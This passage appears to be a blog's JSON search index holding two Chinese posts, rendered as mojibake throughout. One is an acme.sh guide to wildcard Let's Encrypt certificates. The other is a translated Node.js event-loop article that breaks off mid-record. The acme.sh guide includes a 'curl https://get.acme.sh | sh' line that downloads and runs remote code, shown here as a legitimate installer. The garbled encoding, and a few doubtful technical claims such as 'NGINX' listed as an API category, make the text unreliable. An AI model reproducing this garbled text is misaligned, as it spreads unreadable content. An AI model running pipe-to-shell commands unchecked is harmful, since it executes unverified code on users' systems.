å¿…é¡»å…ˆæ‹¥æœ‰æƒå¨ CAï¼ˆè¯ä¹¦ç­¾å‘æœºæ„ï¼‰ç­¾å‘çš„è¯ä¹¦ï¼ˆå¯¹äºè‡ªç­¾åçš„è¯ä¹¦ï¼Œæµè§ˆå™¨æ˜¯ä¸è®¤è´¦çš„ï¼‰ã€‚Letâ€™s Encrypt å°±æ˜¯ä¸€å®¶æƒå¨çš„ CA è¯ä¹¦ç­¾å‘æœºæ„ï¼Œä½ å¯ä»¥å‘ä»–ç”³è¯·å…è´¹çš„è¯ä¹¦ï¼ˆä¸€èˆ¬å•†ä¸šè¯ä¹¦çš„ä»·æ ¼æ¯”è¾ƒè´µï¼‰ã€‚ æ¨èä½¿ç”¨ acme.sh è¿™ä¸ªå·¥å…·ï¼Œç”³è¯·æ³›åŸŸåè¯ä¹¦ç¤ºä¾‹ï¼š æ³¨æ„ï¼šä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæˆ‘çš„äºŒçº§åŸŸåæ˜¯ rifewang.club ï¼ˆä¸€èˆ¬ä½ å‘äº‘æœåŠ¡å•†è´­ä¹°çš„éƒ½æ˜¯äºŒçº§åŸŸåï¼‰ï¼Œæ³›åŸŸåæ˜¯ *.x.rifewang.club ã€‚ 1ã€åœ¨ç³»ç»Ÿä¸Šå®‰è£… acme.sh ï¼Œé»˜è®¤å®‰è£…ä½ç½®æ˜¯ ~/.acme.sh : curl https://get.acme.sh | sh å®‰è£…è¦æ±‚ç³»ç»Ÿå¿…é¡»å·²ç»å®‰è£…äº† cron , crontab , crontabs , vivie-cron å…¶ä¸­ä»»æ„ä¸€ä¸ªå·¥å…·ï¼Œä¸ç„¶ä¼šæç¤ºä½ å®‰è£…å¤±è´¥ï¼Œæ²¡æœ‰çš„è¯å…ˆå®‰è£…ä¸€ä¸ªå³å¯ã€‚ æ³¨æ„ï¼šä»¥ä¸‹æ“ä½œä½¿ç”¨çš„æ˜¯ DNS manual mode çš„æ–¹å¼ã€‚ 2ã€å‘èµ· issue ç”³è¯·è·å–åŸŸå DNS TXT è®°å½•ï¼š acme.sh --issue --force --dns -d \u003cäºŒçº§åŸŸå\u003e -d \u003cæ³›åŸŸå\u003e \\ --yes-I-know-dns-manual-mode-enough-go-ahead-please æ³¨æ„ï¼šä½ å¿…é¡»å…ˆå°† acme.sh è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ·»åŠ åˆ°ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ PATH ä¸­ï¼Œæˆ–è€…ç›´æ¥åœ¨å¯æ‰§è¡Œæ–‡ä»¶ç›®å½•ä¸‹æ‰§è¡Œï¼Œå¦åˆ™è‚¯å®šä¼šæç¤ºä½  acme.sh command not found ã€‚ â€“force å¼ºåˆ¶ issue ï¼ŒæŸäº›æƒ…å†µä¸‹ä½ çš„åŸŸåå·²ç»éªŒè¯æˆåŠŸäº†å°±ä¼šè·³è¿‡éªŒè¯ï¼Œä¸ä¼šç”Ÿæˆæ–°çš„ TXT è®°å½•ï¼Œæ‰€ä»¥è¿™é‡Œå¼ºåˆ¶æ‰§è¡Œä¸€ä¸‹ã€‚ â€“yes-I-knowâ€¦ è¿™ä¸€å †å†—é•¿çš„ä¸œè¥¿æ˜¯å¿…é¡»åŠ çš„ï¼Œè¿™é‡Œå°±æ˜¯æƒ³æç¤ºä½  DNS manual mode çš„æ–¹å¼ä¸æ”¯æŒè‡ªåŠ¨ç»­ç­¾ã€‚ issue ä¹‹åçš„ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š æŒ‰ç…§è¯´æ˜ä½ éœ€è¦åˆ†åˆ«æ·»åŠ  _acme-challenge.\u003cäºŒçº§åŸŸå\u003e å’Œ _acme-challenge.\u003cæ³›åŸŸå\u003e è¿™ä¸¤ä¸ªåŸŸåçš„ TXT ç±»å‹çš„åŸŸåè§£æï¼š ä¹‹æ‰€ä»¥è¦æ·»åŠ åŸŸåè§£ææ˜¯ä¸ºäº†éªŒè¯ä½ å¯¹æ­¤åŸŸåçš„æ‰€æœ‰æƒã€‚ 3ã€ç­‰å¾… DNS TXT è§£æç”Ÿæ•ˆï¼ŒåŒä¸€æ¡è§£æé‡å¤æ›´æ–°éœ€è¦é¿å… DNS ç¼“å­˜çš„é—®é¢˜ã€‚ 4ã€å‘èµ· renew ç”³è¯·ç­¾å‘å¹¶ä¸‹è½½è¯ä¹¦ï¼š acme.sh --renew --force --dns -d \u003cäºŒçº§åŸŸå\u003e -d \u003cæ³›åŸŸå\u003e \\ --yes-I-know-dns-manual-mode-enough-go-ahead-please ç¤ºä¾‹ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š è¾“å‡ºç»“æœé™¤äº†ä¼šå‘Šè¯‰ä½ è¯ä¹¦ç­¾å‘æˆåŠŸä¹‹å¤–ï¼Œè¿˜ä¼šåœ¨æœ€åè¯´æ˜è¯ä¹¦çš„å­˜æ”¾ä½ç½®ï¼Œé»˜è®¤æ˜¯ ~/.acme.sh/\u003cäºŒçº§åŸŸå\u003e/ è¿™ä¸ªç›®å½•ã€‚ 5ã€é…ç½®ä½ çš„è¯ä¹¦å’Œå¯†é’¥ï¼Œå¯¹åº”çš„å°±æ˜¯ fullchain.cer å’Œ \u003cäºŒçº§åŸŸå\u003e.key è¿™ä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚ä¸åŒçš„æƒ…å†µä¸‹ï¼Œé…ç½®çš„æ“ä½œæ˜¯ä¸åŒçš„ï¼šæ¯”å¦‚ä½ æ˜¯åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç›´æ¥æ“ä½œ nginx ï¼Œé‚£ä¹ˆå°†é…ç½®è·¯å¾„æŒ‡å‘æ­£ç¡®çš„è¯ä¹¦å’Œå¯†é’¥åœ°å€å³å¯ï¼Œè€Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯äº‘æœåŠ¡ï¼Œé‚£ä¹ˆä½ å¯èƒ½éœ€è¦åšçš„æ˜¯ä¸Šä¼ è¯ä¹¦å’Œå¯†é’¥æ–‡ä»¶å†…å®¹ã€‚æ€»ä¹‹ï¼Œä½ å·²ç»æˆåŠŸè·å–äº† HTTPS è¯ä¹¦ã€‚ Letâ€™s Encrypt çš„æ³›åŸŸåè¯ä¹¦æœ‰æ•ˆæœŸæ˜¯ä¸‰ä¸ªæœˆï¼Œacme.sh çš„ DNS manual mode æ–¹å¼ä¸æ”¯æŒè‡ªåŠ¨ç»­ç­¾ï¼Œä½ æƒ³è¦ç»­ç­¾å°±å¿…é¡»é‡æ–° issue ç„¶å renew æ“ä½œä¸€éï¼Œæˆ‘ä¹‹æ‰€ä»¥è¿™ä¹ˆåšæ˜¯å› ä¸ºæƒé™å—é™ï¼Œå½“ç„¶å†™ä¸ªå®šæ—¶è„šæœ¬ä»»åŠ¡å°±è¡Œäº†ï¼Œä¹Ÿä¸ç”¨æˆ‘æ‰‹åŠ¨æ“ä½œã€‚ acme.sh ä¸åªä¸€ç§ mode æ–¹å¼ï¼Œå…¶å®ƒçš„æ–¹å¼æ˜¯æœ‰æ”¯æŒè‡ªåŠ¨ç»­ç­¾çš„ï¼Œå¹¶ä¸”ä¹Ÿæ¥å…¥äº†ä¸»æµçš„äº‘æœåŠ¡å•†ï¼ˆä½ åªéœ€è¦é…ç½® apikey å³å¯ï¼‰ï¼Œæ›´å¤šå†…å®¹è¯·å‚è€ƒå®˜ç½‘ã€‚ ","date":"2019-06-27","objectID":"/lets-encrypt/:0:0","tags":[],"title":"Let's Encrypt é…ç½® HTTPS å…è´¹æ³›åŸŸåè¯ä¹¦","uri":"/lets-encrypt/"},{"categories":["Uncate"],"content":"æ·±å…¥ç†è§£ Node.js äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","date":"2019-05-28","objectID":"/nodejs-event-loop-architecture/","tags":["Node.js"],"title":"æ·±å…¥ç†è§£ Node.js äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","uri":"/nodejs-event-loop-architecture/"},{"categories":["Uncate"],"content":"æœ¬æ–‡ç¿»è¯‘è‡ªï¼š https://medium.com/preezma/node-js-event-loop-architecture-go-deeper-node-core-c96b4cec7aa4 å…³äº Node.js ï¼Œç›¸ä¿¡ä½ å·²ç»äº†è§£è¿‡ä¸å°‘å†…å®¹ï¼Œè¯¸å¦‚ Node.js å†…æ ¸ã€äº‹ä»¶å¾ªç¯ã€å•çº¿ç¨‹ã€setTimeout æˆ– setImmediate å‡½æ•°çš„æ‰§è¡Œæœºåˆ¶ç­‰ç­‰ã€‚ å½“ç„¶æœ€é‡è¦çš„ï¼Œä½ åº”è¯¥çŸ¥é“ Node.js ä½¿ç”¨çš„æ˜¯éé˜»å¡ IO æ¨¡å‹ä»¥åŠå¼‚æ­¥çš„ç¼–ç¨‹é£æ ¼ã€‚æœ¬æ–‡ä»å°†æ·±å…¥æ ¸å¿ƒè¿›è¡Œç›¸å…³å†…å®¹çš„æ¢è®¨ã€‚ ","date":"2019-05-28","objectID":"/nodejs-event-loop-architecture/:0:0","tags":["Node.js"],"title":"æ·±å…¥ç†è§£ Node.js äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","uri":"/nodejs-event-loop-architecture/"},{"categories":["Uncate"],"content":"01 äº‹ä»¶å¾ªç¯åˆ°åº•æ˜¯ä»€ä¹ˆï¼ŸNode.js åˆ°åº•æ˜¯å•çº¿ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹ï¼Ÿ å…³äºè¿™ä¸ªé—®é¢˜ï¼Œç½‘ç»œä¸Šå……æ–¥ç€å„ç§ä¸æ¸…æ™°ç”šè‡³é”™è¯¯çš„ç­”æ¡ˆã€‚æœ¬æ–‡å°†ä¼šæ·±å…¥ Node.js å†…æ ¸ï¼Œé˜è¿°å®ƒæ˜¯å¦‚ä½•å®ç°çš„ä»¥åŠå®ƒçš„å·¥ä½œæœºåˆ¶ã€‚ Node.js å¹¶ä¸ä»…ä»…åªæ˜¯ \" JavaScript on the Server \" ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œå…¶ä¸­çº¦ 30% çš„éƒ¨åˆ†æ˜¯ C++ è€Œä¸æ˜¯ JS ã€‚æœ¬æ–‡å°†ä¼šè®²è¿°è¿™äº› C++ éƒ¨åˆ†åœ¨ Node.js ä¸­å®é™…åšäº†ä»€ä¹ˆã€‚ Node.js æ˜¯å•çº¿ç¨‹ï¼Ÿ ç­”æ¡ˆï¼šNode.js æ—¢æ˜¯å•çº¿ç¨‹ï¼Œä½†åŒæ—¶ä¹Ÿä¸æ˜¯ã€‚ ä¸€äº›ç›¸å…³åè¯ï¼šmultitaskingï¼ˆå¤šä»»åŠ¡ï¼‰ã€single-threadedï¼ˆå•çº¿ç¨‹ï¼‰ã€multi-threadedï¼ˆå¤šçº¿ç¨‹ï¼‰ï¼Œthread poolï¼ˆçº¿ç¨‹æ± ï¼‰ã€epoll loopï¼ˆepoll å¾ªç¯ï¼‰ã€event loopï¼ˆäº‹ä»¶å¾ªç¯ï¼‰ã€‚ è®©æˆ‘ä»¬ä»å¤´å¼€å§‹æ·±å…¥äº†è§£ Node.js å†…æ ¸ä¸­å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ å¤„ç†å™¨å¯ä»¥ä¸€æ¬¡å¤„ç†ä¸€ä»¶äº‹ï¼Œä¹Ÿå¯ä»¥ä¸€æ¬¡å¹¶è¡Œåœ°å¤„ç†å¤šä¸ªä»»åŠ¡ï¼ˆmultitaskingï¼‰ã€‚ å¯¹äºå•æ ¸å¤„ç†å™¨ï¼Œå…¶åªèƒ½ä¸€æ¬¡å¤„ç†ä¸€ä¸ªä»»åŠ¡ï¼Œåº”ç”¨ç¨‹åºåœ¨å®Œæˆä»»åŠ¡åè°ƒç”¨ yield å»é€šçŸ¥å¤„ç†å™¨å¼€å§‹å¤„ç†ä¸‹ä¸€ä¸ªä»»åŠ¡ï¼Œå°±åƒ JavaScript ä¸­çš„ generator å‡½æ•°ä¸€æ ·ï¼Œå¦åˆ™æ²¡æœ‰ yield åˆ™å°†è¿”å›å½“å‰ä»»åŠ¡ã€‚åœ¨è¿‡å»ï¼Œå½“åº”ç”¨ç¨‹åºæ— æ³•è°ƒç”¨ yield æ—¶ï¼Œå…¶æœåŠ¡å°†å¤„äºæ— æ³•è®¿é—®çš„çŠ¶æ€ã€‚ è¿›ç¨‹æ˜¯ä¸€ä¸ª top level æ‰§è¡Œå®¹å™¨ï¼Œå®ƒæœ‰è‡ªå·±ä¸“ç”¨çš„å†…å­˜ç³»ç»Ÿã€‚ è¿™æ„å‘³ç€åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­æ— æ³•ç›´æ¥è·å–å¦ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜ä¸­çš„æ•°æ®ï¼Œä¸ºäº†ä½¿ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œé€šä¿¡ï¼Œæˆ‘ä»¬å¿…é¡»è¦å¦å¤–åšä¸€äº›å·¥ä½œï¼Œç§°ä¹‹ä¸º inter-process communicationï¼ˆ IPC ï¼Œè¿›ç¨‹é—´é€šä¿¡ï¼‰ï¼Œå®ƒä¾èµ–äº system socketsï¼ˆç³»ç»Ÿå¥—æ¥å­—ï¼‰ã€‚ Unix ç³»ç»Ÿä¸­çš„å·¥ä½œåŸºäº sockets å¥—æ¥å­—ã€‚Socket å°±æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¿”å›ä¸€ä¸ª Socket() ç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒè¢«ç§°ä¸º socket descriptorï¼ˆå¥—æ¥å­—æè¿°ç¬¦ï¼‰æˆ–è€… file descriptorï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰ã€‚ Sockets é€šè¿‡è™šæ‹Ÿçš„æ¥å£ï¼ˆ read / write / pool / close ç­‰ï¼‰æŒ‡å‘ç³»ç»Ÿå†…æ ¸ä¸­çš„å¯¹è±¡ã€‚ System sockets ç³»ç»Ÿå¥—æ¥å­—çš„å·¥ä½œæ–¹å¼ç±»ä¼¼äº TCP sockets ï¼šå°†æ•°æ®è½¬æ¢ä¸º buffer ç„¶åå‘é€ã€‚ç”±äºæˆ‘ä»¬åœ¨è¿›è¡Œè¿›ç¨‹é—´é€šä¿¡æ—¶ä½¿ç”¨çš„æ˜¯ JavaScript ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»å¤šæ¬¡è°ƒç”¨ JSON.stringify ï¼Œæ˜¾ç„¶è¿™æ˜¯å¾ˆä½æ•ˆçš„ã€‚ ç„¶è€Œï¼Œæˆ‘ä»¬æ‹¥æœ‰çº¿ç¨‹ï¼ æ‰§è¡Œçº¿ç¨‹æ˜¯å¯ç”±è°ƒåº¦å™¨ç‹¬ç«‹ç®¡ç†çš„æœ€å°ç¨‹åºæŒ‡ä»¤åºåˆ—ã€‚ çº¿ç¨‹åœ¨è¿›ç¨‹ä¸­è¿è¡Œï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŒ…å«è®¸å¤šçº¿ç¨‹ï¼Œå¹¶ä¸”ç”±äºè¿™äº›çº¿ç¨‹å¤„äºåŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œå› æ­¤å®ƒä»¬å…±äº«åŒä¸€ä¸ªå†…å­˜ã€‚ è¿™ä¹Ÿå°±æ˜¯è¯´çº¿ç¨‹é—´é€šä¿¡ä¸éœ€è¦åšä»»ä½•é¢å¤–çš„äº‹æƒ…ã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­æ‰˜ç®¡ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸­è®¿é—®å®ƒï¼Œå› ä¸ºå®ƒä»¬éƒ½ä¿æŒå¯¹åŒä¸€ä¸ªå†…å­˜çš„å¼•ç”¨ï¼Œè¿™ç§æ–¹å¼éå¸¸é«˜æ•ˆã€‚ ä½†æ˜¯æˆ‘ä»¬å‡è®¾åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒå†™å…¥ä¸€ä¸ª foo å˜é‡ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹åˆ™ä»ä¸­è¯»å–ï¼Œè¿™å°†ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ ç­”æ¡ˆæ— ä»å¾—çŸ¥ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•ç¡®å®šè¯»å’Œå†™çš„å…ˆåé¡ºåºã€‚è¿™ä¹Ÿæ­£æ˜¯å¤šçº¿ç¨‹ç¼–ç¨‹çš„éš¾ç‚¹æ‰€åœ¨ã€‚è®©æˆ‘ä»¬çœ‹çœ‹ Node.js å¦‚ä½•å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚ Node.js è¯´ï¼šæˆ‘åªæœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚ å®é™…ä¸Šï¼ŒNode.js åŸºäº V8 å¼•æ“ï¼Œä»£ç åœ¨ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œäº‹ä»¶å¾ªç¯ä¹Ÿè¿è¡Œåœ¨ä¸»çº¿ç¨‹ä¸­ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬è¯´ Node.js æ˜¯å•çº¿ç¨‹çš„ã€‚ ä½†æ˜¯ï¼ŒNode.js ä¸ä»…ä»…åªæ˜¯ V8ï¼Œå®ƒæœ‰è®¸å¤š APIsï¼ˆC++ï¼‰ï¼Œå¹¶ä¸”è¿™äº› API éƒ½ç”± Event Loop äº‹ä»¶å¾ªç¯ç®¡ç†ï¼Œé€šè¿‡ libuvï¼ˆC++ï¼‰å®ç°ã€‚ C++ åœ¨åå°æ‰§è¡Œ JavaScript ä»£ç å¹¶ä¸”æ‹¥æœ‰è®¿é—®çº¿ç¨‹çš„æƒé™ã€‚å¦‚æœä½ æ‰§è¡Œä» Node.js ä¸­è°ƒç”¨çš„ JavaScript åŒæ­¥æ–¹æ³•ï¼Œå®ƒå°†å§‹ç»ˆåœ¨ä¸»çº¿ç¨‹ä¸­è¿è¡Œã€‚ä½†æ˜¯å¦‚æœä½ æ‰§è¡Œä¸€äº›å¼‚æ­¥çš„ä»»åŠ¡ï¼Œå®ƒä¸ä¼šæ€»æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œï¼šæ ¹æ®ä½ ä½¿ç”¨çš„æ–¹æ³•ï¼Œäº‹ä»¶å¾ªç¯å¯ä»¥å°†å®ƒè·¯ç”±åˆ° APIs ä¸­çš„æŸä¸€ä¸ªï¼Œå¹¶ä¸”å®ƒå¯ä»¥åœ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œã€‚ çœ‹ä¸€ä¸ªç¤ºä¾‹ CRYPTO ï¼Œå®ƒæœ‰è®¸å¤š CPU å¯†é›†å‹æ–¹æ³•ï¼Œä¸€äº›æ˜¯åŒæ­¥çš„ï¼Œä¸€äº›æ˜¯å¼‚æ­¥çš„ã€‚è¿™é‡Œçœ‹ä¸€ä¸‹ pbkdf2 æ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬åœ¨ 2 æ ¸å¤„ç†å™¨ä¸­æ‰§è¡Œå…¶åŒæ­¥ç‰ˆæœ¬å¹¶è¿›è¡Œ 4 æ¬¡è°ƒç”¨ï¼Œå‡è®¾ä¸€æ¬¡è°ƒç”¨çš„æ‰§è¡Œæ—¶é—´æ˜¯ 2 ms ï¼Œåˆ™æ€»è€—æ—¶ä¸º 4 * 2 ms = 8 ms ã€‚ ä½†æ˜¯å¦‚æœåœ¨åŒä¸€ä¸ª CPUï¼ˆ2æ ¸ï¼‰ä¸­æ‰§è¡Œè¿™ä¸ªæ–¹æ³•çš„å¼‚æ­¥ç‰ˆæœ¬ï¼Œæ€»è€—æ—¶åˆ™ä¸º 2 * 2 ms = 4 ms ï¼Œå› ä¸ºå¤„ç†å™¨å°†ä½¿ç”¨é»˜è®¤ 4 ä¸ªçº¿ç¨‹ï¼ˆä¸‹æ–‡å°†ä¼šè¯´æ˜ï¼‰ï¼Œå°†å®ƒæ‰˜ç®¡åˆ°ä¸¤ä¸ªè¿›ç¨‹ä¸­å¹¶æ‰§è¡Œã€‚ è¿™ä¹Ÿå°±æ˜¯ï¼šNode.js å¹¶å‘åœ°æ‰§è¡Œå¼‚æ­¥æ–¹æ³•ã€‚ Node.js ä½¿ç”¨ä¸€ç»„é¢„å…ˆåˆ†é…çš„çº¿ç¨‹ï¼Œç§°ä¹‹ä¸ºçº¿ç¨‹æ± ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šè¦æ‰“å¼€çš„çº¿ç¨‹æ•°ï¼Œå®ƒé»˜è®¤å°±æ˜¯ä½¿ç”¨ 4 ä¸ªçº¿ç¨‹ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ UV_THREADPOOL_SIZE è¿›è¡Œè®¾ç½®ã€‚ æ‰€ä»¥ï¼ŒNode.js æ˜¯å¤šçº¿ç¨‹çš„å—ï¼Ÿ å½“ç„¶ï¼ŒNode.js ä½¿ç”¨äº†å¤šçº¿ç¨‹ã€‚ ç„¶è€Œï¼ŒNode.js åˆ°åº•æ˜¯å•çº¿ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹ï¼Œè¿™å–å†³äº when ï¼Ÿ ","date":"2019-05-28","objectID":"/nodejs-event-loop-architecture/:1:0","tags":["Node.js"],"title":"æ·±å…¥ç†è§£ Node.js äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","uri":"/nodejs-event-loop-architecture/"},{"categories":["Uncate"],"content":"02 æˆ‘ä»¬æ¥çœ‹çœ‹ TCP è¿æ¥ã€‚ Thread per connection ï¼š åˆ›å»ºä¸€ä¸ª TCP server æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯åˆ›å»ºä¸€ä¸ª socket ï¼Œç»‘å®šè¿™ä¸ª socket åˆ°æŸä¸ªç«¯å£ä¸Šç„¶å listen ç›‘å¬ã€‚ åœ¨æˆ‘ä»¬è°ƒç”¨ listen ä¹‹å‰ï¼Œè¯¥ socket å¯ç”¨äºå»ºç«‹è¿æ¥æˆ–æ¥å—è¿æ¥ã€‚å½“æˆ‘ä»¬è°ƒç”¨ listen æ—¶ï¼Œæˆ‘ä»¬å‡†å¤‡æ¥å—è¿æ¥ã€‚ å½“è¿æ¥åˆ°è¾¾å¹¶ä¸”æˆ‘ä»¬éœ€è¦å†™å…¥å®ƒæ—¶ï¼Œç›´åˆ°æˆ‘ä»¬å®Œæˆå†™å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½æ— æ³•æ¥å—å¦ä¸€ä¸ªè¿æ¥ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å°†å®ƒæ¨å…¥å¦ä¸€ä¸ªçº¿ç¨‹çš„åŸå› ã€‚æ‰€ä»¥æˆ‘ä»¬å°† socket descriptor å’Œ function pointer ä¼ é€’ç»™çº¿ç¨‹ã€‚ ç°åœ¨ï¼Œç³»ç»Ÿå¯ä»¥è½»æ¾å¤„ç†å‡ åƒä¸ªçº¿ç¨‹ï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæ¯ä¸ªè¿æ¥å‘çº¿ç¨‹å‘é€å¤§é‡æ•°æ®ï¼Œå¹¶ä¸”è¿™æ ·åšå¹¶ä¸èƒ½å¾ˆå¥½çš„æ‰©å±•åˆ°ä¸¤ä¸‡åˆ°å››ä¸‡ä¸ªå¹¶å‘è¿æ¥ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬å®é™…éœ€è¦çš„ä»…ä»…åªæ˜¯ socket descriptor å¥—æ¥å­—æè¿°ç¬¦ï¼Œå¹¶è®°ä½æˆ‘ä»¬è¦åšçš„äº‹æƒ…ï¼ˆä¹Ÿå°±æ˜¯å¦‚ä½•ä½¿ç”¨è¿™äº›å¥—æ¥å­—ï¼‰ã€‚æ‰€ä»¥æœ‰ä¸€ç§æ›´å¥½çš„æ–¹æ³•ï¼šä½¿ç”¨ Epollï¼ˆunixç³»ç»Ÿï¼‰æˆ–ç€ Kqueueï¼ˆBSDç³»ç»Ÿï¼Œå…¶å®è·Ÿ Epoll æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œä¸åŒç³»ç»Ÿåç§°ä¸ä¸€æ ·è€Œå·²ï¼‰ã€‚ Epoll æ˜¯ unix ç³»ç»Ÿç›¸å…³åº•å±‚çŸ¥è¯†ã€‚ Epoll å¾ªç¯ï¼š Epoll èƒ½ä¸ºæˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒã€‚ä½¿ç”¨ Epoll å…è®¸æˆ‘ä»¬å‘Šè¯‰ Kernelï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰æˆ‘ä»¬å…³æ³¨çš„äº‹ä»¶ï¼Œå¹¶ä¸” Kernel å°†ä¼šå‘Šè¯‰æˆ‘ä»¬è¿™äº›äº‹ä»¶ä½•æ—¶å‘ç”Ÿã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯ä¼ å…¥çš„ TCP è¿æ¥ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª Epoll æè¿°ç¬¦å¹¶å°†å…¶æ·»åŠ åˆ° Epoll å¾ªç¯ä¸­ï¼Œå¹¶è°ƒç”¨ wait ã€‚æ¯å½“æœ‰ TCP è¿æ¥ä¼ å…¥æ—¶ä¾¿ä¼šå”¤é†’ï¼Œç„¶åå°†å®ƒæ·»åŠ åˆ° Epoll å¾ªç¯ä¸­å¹¶ç­‰å¾…æ¥è‡ªå®ƒçš„æ•°æ®ã€‚è¿™å°±æ˜¯äº‹ä»¶å¾ªç¯ä¸ºæˆ‘ä»¬åšçš„äº‹æƒ…ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š å½“æˆ‘ä»¬é€šè¿‡ http è¯·æ±‚å‘åŒä¸€ä¸ª 2 æ ¸å¤„ç†å™¨ä¸‹è½½æ•°æ®æ—¶ï¼Œ4 ä¸ªï¼Œ6 ä¸ªï¼Œç”šè‡³ 8 ä¸ªè¯·æ±‚éœ€è¦çš„æ—¶é—´ç›¸åŒã€‚è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿè¿™æ„å‘³ç€è¿™é‡Œçš„é™åˆ¶ä¸æˆ‘ä»¬åœ¨çº¿ç¨‹æ± ä¸­çš„é™åˆ¶ä¸åŒã€‚ å› ä¸ºæ“ä½œç³»ç»Ÿè´Ÿè´£ä¸‹è½½ï¼Œæˆ‘ä»¬åªæ˜¯è¦æ±‚å®ƒä¸‹è½½ï¼Œç„¶åé—®å®ƒï¼šå®Œæˆäº†å—ï¼Ÿè¿˜æ²¡å¥½å—ï¼Ÿå®Œæˆäº†å—ï¼Ÿï¼ˆç›‘å¬ Epoll ä¸­çš„ data äº‹ä»¶ï¼‰ã€‚ ","date":"2019-05-28","objectID":"/nodejs-event-loop-architecture/:2:0","tags":["Node.js"],"title":"æ·±å…¥ç†è§£ Node.js äº‹ä»¶å¾ªç¯æ¶æ„ã€è¯‘ã€‘","uri":"/nodejs-event-loop-architecture/"},{"categories":["Uncate"],"content":"03 APIs å“ªäº› API å¯¹åº”äºå“ªç§æ–¹å¼å‘¢ï¼Ÿï¼ˆçº¿ç¨‹ï¼ŒEpollï¼‰ æ‰€æœ‰ fs.* æ–¹æ³•ä½¿ç”¨ uv thread poolï¼Œé™¤éæ˜¯åŒæ­¥æ–¹æ³•ã€‚é˜»å¡è°ƒç”¨ç”±çº¿ç¨‹å®Œæˆï¼Œå®Œæˆåå°†ä¿¡å·å‘é€å›äº‹ä»¶å¾ªç¯ã€‚æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨ Epoll ä¸­ wait ï¼Œåªèƒ½ pipe ã€‚Pipe ç®¡é“è¿æ¥ä¸¤ç«¯ï¼šä¸€ç«¯æ˜¯çº¿ç¨‹ï¼Œå½“å®ƒå®Œæˆæ—¶ï¼Œå¾€ç®¡é“ä¸­å†™å…¥æ•°æ®ï¼Œå¦ä¸€ç«¯åœ¨ Epoll å¾ªç¯ä¸­ç­‰å¾…ï¼Œå½“å®ƒè·å–åˆ°æ•°æ®æ—¶ï¼ŒEpoll å¾ªç¯å”¤é†’ã€‚å› æ­¤ pipe æ˜¯ç”± Epoll å“åº”çš„ã€‚ ä¸€äº›ä¸»è¦çš„æ–¹æ³•åŠå…¶å¯¹åº”çš„å“åº”æ–¹å¼ï¼š EPOLL ï¼š TCP/UDP servers and clients pipes dns.resolve NGINX ï¼š nginx signals ( sigterm ) Child processes ( exec, spawn ) TTY input ( console ) THREAD POOL ï¼š fs. dns.lookup äº‹ä»¶å¾ªç¯è´Ÿè´£å‘é€å’Œæ¥å—ç»“æœï¼Œå¦‚åŒä¸­å¤®è°ƒåº¦å™¨ä¸€èˆ¬ï¼Œå°†è¯·æ±‚è·¯ç”±åˆ° C++ APIï¼Œç„¶åå°†ç»“æœè¿”å›ç»™ JavaScript ã€‚ ","date":"2019-05-28","objectID":"/nodejs-event-loop-architecture/:3:0","tags":["Node.js"],"title":"æ·±å…¥ç†è§£ Node.js 